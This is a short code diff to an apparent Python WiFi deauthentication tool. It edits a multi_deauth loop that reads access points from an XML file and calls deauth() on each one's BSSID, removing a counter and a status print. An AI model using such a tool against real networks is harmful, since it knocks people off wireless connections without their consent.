@@ -17,8 +17,6 @@ def channel_hopper(channel, interface):
 def multi_deauth(fileName,iface,client):
     apsList = ET.parse(fileName)
     aps = apsList.getroot()
-    count = 1
-
     while True:
         for ap in aps.findall('AccessPoint'):
             c = str(ap.get('Channel'))
@@ -30,8 +28,7 @@ def multi_deauth(fileName,iface,client):
                 if str(ap.get('Channel')) == channels[j]:
                     bssid = str(ap.findtext('BSSID'))
                     ssid = str(ap.findtext('SSID'))
-                    print('[Deauthenticating]: %s' %(ssid))
-                    deauth(iface, bssid, client, count)
+                    deauth(iface, bssid, client)
 
 
  
